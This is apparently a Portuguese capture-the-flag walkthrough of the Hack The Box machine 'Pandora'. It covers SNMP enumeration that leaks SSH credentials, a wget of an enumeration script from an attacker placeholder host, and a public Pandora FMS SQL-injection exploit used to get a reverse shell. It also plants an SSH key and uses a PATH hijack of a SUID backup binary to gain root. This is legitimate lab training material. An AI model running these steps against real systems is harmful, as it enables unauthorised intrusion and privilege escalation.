Pandora
========================
## Enumeration

    sudo nmap_enum 10.129.235.55

Com a conclusão desse primeiro momento não foi possível obter nada interessante, então partimos para o mapeamento UDP

    sudo nmap -sU -p 53,161,111,137,139,2049 -Pn pandora.htb


Com isso vimos que a porta SNMP (161) estava aberta. Começamos a enumerar

    snmpwalk -v 1 -c public pandora.htb
 
 Isso demorou demais. Então partimos para uma outra abordagem que resultou nisto aqui:
 
     sudo nmap -sU -p 161 --script "snmp*" pandora.htb
 
 ![qownnotes-media-klYVQw](../../../media/qownnotes-media-klYVQw.png)


No meio da resposta do output do nmap verificamos as credenciais:

daniel
HotelBabylon23

## Exploitation

Após achar essas crendeicias na etapa de enumeração, acessamos o servidor via ssh e fomos seguir a metodologia de enumeração apra escalação de privilégio:

    netstat -nat
    
    ps aux
    
    uname -a
    
    cat /etc/issues
    
    cat /proc/version
    
    wget http://<IP_ATTACKER>/linux/4-privilege_escalation/LinEnum.sh -O le
    chmod +x le
    ./le



    cat /etc/apache2/sites-enabled/*.conf
 
 ![qownnotes-media-IEZlGE](../../../media/qownnotes-media-IEZlGE.png)

    sudo ssh -N -L 9001:127.0.0.1:80 daniel@pandora.htb

![qownnotes-media-aPzfTJ](../../../media/qownnotes-media-aPzfTJ.png)
 
![qownnotes-media-hKNTKB](../../../media/qownnotes-media-hKNTKB.png)

    searchsploit v7.0NG.742
 
Não funcionou esse exploit abaixo:
![qownnotes-media-EkdJbi](../../../media/qownnotes-media-EkdJbi.png)

Esse link abaixo funcionou:
![qownnotes-media-sTPbOv](../../../media/qownnotes-media-sTPbOv.png)


https://raw.githubusercontent.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/master/sqlpwn.py

    python exploit.py -t 127.0.0.1:9001 -f php-reverse-shell.php

![qownnotes-media-KwGLFa](../../../media/qownnotes-media-KwGLFa.png)

 
## PrivEsc


Vamos lá... consegui a shell como o matt... Detalhe que agora a gente sabe que existe uma funcionalidade chamada "pandora_backup" que é SUIID por meio do seguinte comando:

    find / -perm -u=s -type f 2>/dev/null

![qownnotes-media-VfCPHE](../../../media/qownnotes-media-VfCPHE.png)

Com o ltrace, dá pra saber quais são as chamadas de sistema que a ferramenta faz:

    ltrace pandora_backup
    
 ![qownnotes-media-vxGGba](../../../media/qownnotes-media-vxGGba.png)

Dessa forma, vimos que foi feita uma chamada para o programa tar, sem o full path e, sendo assim, é possível fazer um hijack da variável PATH com o seguinte comando:

    PATH=/tmp:$PATH

Então, escrevemos um script que chama "tar" dentro da pasta /tmp com o seguinte conteúdo:

    root@pandora:/# cat /tmp/tar 
    #!/bin/bash
    
    bash

Mas, não funciona com a shell qeuu conseguimos, teríamos de subir a shell para um SSH. Para isso, eu gerei uma chave pública SSH na minha máquina mesmo e depois subi essa chave para o servidor copiando e colando a chave:

    ssh-keygen -t rsa -b 4096 -C "your_email@example.com"
    cat /home/acosta/.ssh/id_rsa.pub                                                                                                                                                                                                        
    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC+vUmSoQYulCS3BjV7/3gmw6UVaK6IEpKS8Gp8/dZerdbN0CZrTl6iXkJHw1iew45vCgoo42/tf8rd8WP+vajgJBtYExBXP4aAGoOUgro1GmPyVsxVLkgI4ZKTlaBDfy+oB6jPr+BugzYOQ+KNOEizS9AhxdVSDNJag+3loU7qr+bkoaEX0ddrM9O8UZ8VJRXaLlXVGTWVCBBzt7MltKOyeW9Nygf8eE7kEdp++lJejpITx4j5wSzrU6G3tTxqr98315vmqm4OVa3s3araIdYcDgtlETc/5Z/ydaZJFrKLDxbmoDRCLp62Pu8kXN+Sm0v5IZ+727Y3aeoOakXVPddnDJw37hZitT0dKzUfM6WuEqr4QkXwOIxTbqJ6MEKiep0Kx+LNrG9bC1X57x/8b3IsinX4qklbwQ/KTPySBSTW2kTZ+q7DUnfUkwoirOBZ7mVfloAuyeYFgjh6mrxLNHxmb4/sG6nmqQEhk6Hmw8fAaAf2giF+7p55GdZAs5SoxU90Wkr0mkfeqOEcSLQscSpRLa/tddvkXeaCe8X1xyWJID1UzZKwnRQ+aIU2YvCFSm870sBMed+U6P1R7GQBnpe9YHc4ndMah8LMnYbS31TPsUeoK31CUGlGIOyv0L5Vvt3/B7b9QqcslUpck5OC8YZErVHuoRpPGpKVIxfTe3clUw== your_email@example.com

Na máquina vítima:

    mkdir .ssh
    cd .ssh/
    vi authorized_keys

![qownnotes-media-gZaUWY](../../../media/qownnotes-media-gZaUWY.png)

Path hijack

![qownnotes-media-HOjyiN](../../../media/qownnotes-media-HOjyiN.png)

    ssh -i /home/acosta/.ssh/id_rsa matt@pandora.htb

    cd /tmp
    vi tar
    PATH=/tmp:$PATH
    pandora_backup

![qownnotes-media-tYHzOw](../../../media/qownnotes-media-tYHzOw.png)

